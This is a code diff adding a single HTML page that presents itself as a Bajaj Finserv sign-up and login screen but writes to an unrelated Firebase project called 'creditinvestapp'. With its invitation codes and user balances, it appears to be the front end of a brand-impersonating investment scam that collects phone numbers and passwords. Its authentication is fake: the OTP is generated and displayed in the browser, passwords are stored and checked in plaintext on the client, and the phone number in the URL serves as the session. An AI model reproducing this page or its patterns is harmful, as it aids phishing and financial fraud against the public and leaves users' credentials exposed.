@@ -1,0 +1,413 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bajaj Finance - Auth</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #0056b3;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .main-wrapper {
+            width: 100%;
+            max-width: 440px;
+            background: #0056b3;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+        }
+        .header {
+            padding: 20px 10px;
+            color: white;
+            text-align: center;
+        }
+        .header h1 { font-size: 26px; font-weight: 800; margin-bottom: 4px; }
+        .header p { font-size: 14px; color: #e0f7ff; }
+        .auth-card {
+            background: white;
+            border-radius: 24px;
+            padding: 30px 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.15);
+            margin-top: 15px;
+        }
+        .tabs {
+            display: flex;
+            justify-content: space-around;
+            margin-bottom: 25px;
+            position: relative;
+        }
+        .tab { font-size: 18px; font-weight: 700; color: #aaa; cursor: pointer; padding-bottom: 8px; }
+        .tab.active { color: #0056b3; }
+        .input-group { margin-bottom: 16px; }
+        .input-group label { display: block; font-size: 13px; font-weight: 600; color: #333; margin-bottom: 6px; }
+        .input-box {
+            display: flex;
+            align-items: center;
+            background: #f8f9fa;
+            border: 1px solid #dcdcdc;
+            border-radius: 12px;
+            padding: 12px 14px;
+        }
+        .input-box input { width: 100%; border: none; outline: none; background: transparent; font-size: 14px; color: #333; }
+        .prefix { font-size: 14px; font-weight: 600; color: #333; margin-right: 8px; border-right: 1px solid #ccc; padding-right: 8px; }
+        .otp-row { display: flex; gap: 10px; align-items: center; }
+        .send-otp-btn {
+            background: #0056b3; color: white; border: none;
+            padding: 0 18px; border-radius: 12px; font-weight: bold;
+            font-size: 13px; cursor: pointer; height: 48px; flex-shrink: 0;
+        }
+        .action-btn {
+            background: #0056b3; color: white; border: none;
+            width: 100%; padding: 15px; font-weight: bold;
+            border-radius: 14px; cursor: pointer; font-size: 16px;
+            margin-top: 15px; box-shadow: 0 4px 12px rgba(0,86,179,0.3);
+        }
+
+        /* --- VIP PREMIUM SUCCESS MODAL --- */
+        #success-modal {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.7); backdrop-filter: blur(5px);
+            display: none; justify-content: center; align-items: center; z-index: 2000;
+            padding: 20px;
+        }
+        .modal-content {
+            background: linear-gradient(145deg, #ffffff, #f0f4f8);
+            width: 100%; max-width: 360px;
+            padding: 30px 24px; border-radius: 24px; text-align: center;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.3);
+            border: 1px solid rgba(255,255,255,0.8);
+            animation: vipScaleUp 0.35s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+        @keyframes vipScaleUp {
+            from { transform: scale(0.7); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+        .vip-icon-box {
+            width: 60px; height: 60px; background: #e6f0fa; border-radius: 50%;
+            display: flex; align-items: center; justify-content: center; margin: 0 auto 15px auto;
+            color: #0056b3; font-size: 28px; box-shadow: 0 5px 15px rgba(0,86,179,0.15);
+        }
+        .modal-content h3 {
+            color: #111; font-size: 22px; font-weight: 800; margin-bottom: 6px;
+        }
+        .modal-subtitle {
+            font-size: 13px; color: #666; margin-bottom: 20px;
+        }
+        
+        /* VIP Credential Display Boxes */
+        .vip-cred-container {
+            display: flex; flex-direction: column; gap: 10px; margin-bottom: 20px;
+        }
+        .vip-box {
+            background: #f8fafc; border: 1.5px solid #e2e8f0; border-radius: 14px;
+            padding: 12px 16px; display: flex; justify-content: space-between; align-items: center;
+            text-align: left;
+        }
+        .vip-label {
+            font-size: 12px; font-weight: 600; color: #64748b; text-transform: uppercase; letter-spacing: 0.5px;
+        }
+        .vip-value {
+            font-size: 15px; font-weight: 700; color: #0f172a; font-family: monospace;
+        }
+
+        .home-redirect-btn {
+            background: linear-gradient(135deg, #0056b3, #004085);
+            color: white; border: none; width: 100%; padding: 14px;
+            font-weight: 700; border-radius: 14px; cursor: pointer; font-size: 15px;
+            box-shadow: 0 6px 15px rgba(0,86,179,0.3);
+            transition: transform 0.2s;
+        }
+        .home-redirect-btn:active { transform: scale(0.98); }
+
+        #custom-toast {
+            position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%);
+            background: rgba(0, 0, 0, 0.85); color: white; padding: 12px 24px;
+            border-radius: 30px; font-size: 13px; display: none; z-index: 1000;
+        }
+    </style>
+
+    <!-- Firebase SDKs (Acode Compatible CDN) -->
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
+</head>
+<body>
+
+    <div class="main-wrapper">
+        <div class="header">
+            <h1>BAJAJ FINSERV</h1>
+            <p>A product by Bajaj Finance</p>
+        </div>
+
+        <div class="auth-card">
+            <div class="tabs">
+                <div class="tab" id="loginTab" onclick="switchTab('login')">Log in</div>
+                <div class="tab active" id="signupTab" onclick="switchTab('signup')">Sign up</div>
+            </div>
+
+            <!-- Sign Up Form -->
+            <div id="signupSection">
+                <div class="input-group">
+                    <label>Phone Number</label>
+                    <div class="input-box">
+                        <span class="prefix">+91</span>
+                        <input type="text" id="regPhone" placeholder="Please enter your phone number">
+                    </div>
+                </div>
+
+                <div class="input-group">
+                    <label>Login Password</label>
+                    <div class="input-box">
+                        <input type="password" id="regPass" placeholder="Set log in password">
+                    </div>
+                </div>
+
+                <div class="input-group">
+                    <label>Nick name</label>
+                    <div class="input-box">
+                        <input type="text" id="regNick" placeholder="Enter your nick name">
+                    </div>
+                </div>
+
+                <div class="input-group">
+                    <label>Invitation code (Optional)</label>
+                    <div class="input-box">
+                        <input type="text" id="regInvite" placeholder="Invitation code">
+                    </div>
+                </div>
+
+                <div class="input-group">
+                    <label>Verification code (OTP)</label>
+                    <div class="otp-row">
+                        <div class="input-box" style="flex: 1;">
+                            <input type="text" id="regOtp" placeholder="Verification code (OTP)">
+                        </div>
+                        <button class="send-otp-btn" onclick="sendOTP()">Send</button>
+                    </div>
+                </div>
+
+                <button class="action-btn" id="registerBtn">Register Now</button>
+            </div>
+
+            <!-- Login Form -->
+            <div id="loginSection" style="display: none;">
+                <div class="input-group">
+                    <label>Phone Number</label>
+                    <div class="input-box">
+                        <span class="prefix">+91</span>
+                        <input type="text" id="loginPhone" placeholder="Please enter your phone number">
+                    </div>
+                </div>
+
+                <div class="input-group">
+                    <label>Login Password</label>
+                    <div class="input-box">
+                        <input type="password" id="loginPass" placeholder="Please enter your login password">
+                    </div>
+                </div>
+
+                <button class="action-btn" id="loginBtn">Login in now</button>
+            </div>
+        </div>
+
+        <!-- VIP Success Modal Popup -->
+        <div id="success-modal">
+            <div class="modal-content">
+                <div class="vip-icon-box">✓</div>
+                <h3 id="modalTitle">Registration Successful</h3>
+                <div class="modal-subtitle" id="modalSubText">Save your login details securely</div>
+                
+                <div class="vip-cred-container" id="modalBody">
+                    <!-- Dynamic boxes will render here -->
+                </div>
+
+                <button class="home-redirect-btn" id="goToHomeBtn">Continue to Home</button>
+            </div>
+        </div>
+
+        <div id="custom-toast">Message here</div>
+    </div>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyAyFldowBw6ChbopLGCCQ8U7_RH4kmyFpM",
+            authDomain: "creditinvestapp.firebaseapp.com",
+            projectId: "creditinvestapp",
+            storageBucket: "creditinvestapp.firebasestorage.app",
+            messagingSenderId: "299058832737",
+            appId: "1:299058832737:web:fe1c1df553e209715c1120"
+        };
+
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
+
+        let generatedOtp = "";
+        let registeredPhoneNo = "";
+
+        window.addEventListener('DOMContentLoaded', () => {
+            const urlParams = new URLSearchParams(window.location.search);
+            const inviteCodeFromURL = urlParams.get('invite');
+            if(inviteCodeFromURL) {
+                document.getElementById('regInvite').value = inviteCodeFromURL;
+            }
+        });
+
+        window.showToast = function(msg) {
+            let toast = document.getElementById('custom-toast');
+            toast.innerText = msg;
+            toast.style.display = 'block';
+            setTimeout(() => { toast.style.display = 'none'; }, 3000);
+        };
+
+        window.switchTab = function(tab) {
+            const loginTab = document.getElementById('loginTab');
+            const signupTab = document.getElementById('signupTab');
+            const loginSec = document.getElementById('loginSection');
+            const signupSec = document.getElementById('signupSection');
+
+            if(tab === 'login') {
+                loginTab.classList.add('active');
+                signupTab.classList.remove('active');
+                loginSec.style.display = 'block';
+                signupSec.style.display = 'none';
+            } else {
+                signupTab.classList.add('active');
+                loginTab.classList.remove('active');
+                signupSec.style.display = 'block';
+                loginSec.style.display = 'none';
+            }
+        };
+
+        window.sendOTP = function() {
+            const phone = document.getElementById('regPhone').value.trim();
+            if(!phone || phone.length < 10) {
+                showToast("Please enter a valid 10-digit phone number!");
+                return;
+            }
+            generatedOtp = Math.floor(1000 + Math.random() * 9000).toString();
+            document.getElementById('regOtp').value = generatedOtp;
+            showToast("Your OTP is: " + generatedOtp);
+        };
+
+        // Register Button Click Handler
+        document.getElementById('registerBtn').addEventListener('click', async () => {
+            const phone = document.getElementById('regPhone').value.trim();
+            const pass = document.getElementById('regPass').value.trim();
+            const nick = document.getElementById('regNick').value.trim();
+            const invite = document.getElementById('regInvite').value.trim() || "None";
+            const otp = document.getElementById('regOtp').value.trim();
+
+            if(!phone || !pass || !nick || !otp) {
+                showToast("Please fill all the required fields!");
+                return;
+            }
+
+            if(otp !== generatedOtp) {
+                showToast("Invalid Verification Code (OTP)!");
+                return;
+            }
+
+            try {
+                const userRef = db.collection("users").doc(phone);
+                const userSnap = await userRef.get();
+
+                if(userSnap.exists) {
+                    // Already Registered VIP Notice Box
+                    document.getElementById('modalTitle').innerText = "Notice";
+                    document.getElementById('modalSubText').innerText = "Account Status Alert";
+                    document.getElementById('modalBody').innerHTML = `
+                        <div class="vip-box" style="justify-content: center; text-align: center; padding: 15px;">
+                            <span class="vip-value" style="color: #d97706;">This mobile number is already registered!</span>
+                        </div>
+                    `;
+                    
+                    const homeBtn = document.getElementById('goToHomeBtn');
+                    homeBtn.innerText = "Close";
+                    homeBtn.onclick = () => {
+                        document.getElementById('success-modal').style.display = 'none';
+                    };
+
+                    document.getElementById('success-modal').style.display = 'flex';
+                    return;
+                }
+
+                await userRef.set({
+                    phone: phone,
+                    password: pass,
+                    nickname: nick,
+                    inviteCode: invite,
+                    balance: 0.00,
+                    createdAt: new Date()
+                });
+
+                registeredPhoneNo = phone;
+
+                // VIP Success Modal Box Design
+                document.getElementById('modalTitle').innerText = "Registration Successful";
+                document.getElementById('modalSubText').innerText = "Your account has been created successfully";
+                document.getElementById('modalBody').innerHTML = `
+                    <div class="vip-box">
+                        <span class="vip-label">Phone No</span>
+                        <span class="vip-value">+91 ${phone}</span>
+                    </div>
+                    <div class="vip-box">
+                        <span class="vip-label">Password</span>
+                        <span class="vip-value">${pass}</span>
+                    </div>
+                `;
+
+                const homeBtn = document.getElementById('goToHomeBtn');
+                homeBtn.innerText = "Continue to Home";
+                homeBtn.onclick = () => {
+                    window.location.href = `home.html?phone=${registeredPhoneNo}`;
+                };
+
+                document.getElementById('success-modal').style.display = 'flex';
+
+            } catch (error) {
+                console.error("Firebase Error: ", error);
+                showToast("Registration failed! Check console.");
+            }
+        });
+
+        // Login Button Handler
+        document.getElementById('loginBtn').addEventListener('click', async () => {
+            const phone = document.getElementById('loginPhone').value.trim();
+            const pass = document.getElementById('loginPass').value.trim();
+
+            if(!phone || !pass) {
+                showToast("Please enter phone and password!");
+                return;
+            }
+
+            try {
+                const userRef = db.collection("users").doc(phone);
+                const userSnap = await userRef.get();
+
+                if(userSnap.exists) {
+                    const data = userSnap.data();
+                    if(data.password === pass) {
+                        showToast("Login Successful!");
+                        setTimeout(() => {
+                            window.location.href = `home.html?phone=${phone}`;
+                        }, 1000);
+                    } else {
+                        showToast("Incorrect password!");
+                    }
+                } else {
+                    showToast("User not found! Please register first.");
+                }
+            } catch (error) {
+                console.error("Error: ", error);
+                showToast("Login failed!");
+            }
+        });
+    </script>
+</body>
+</html>
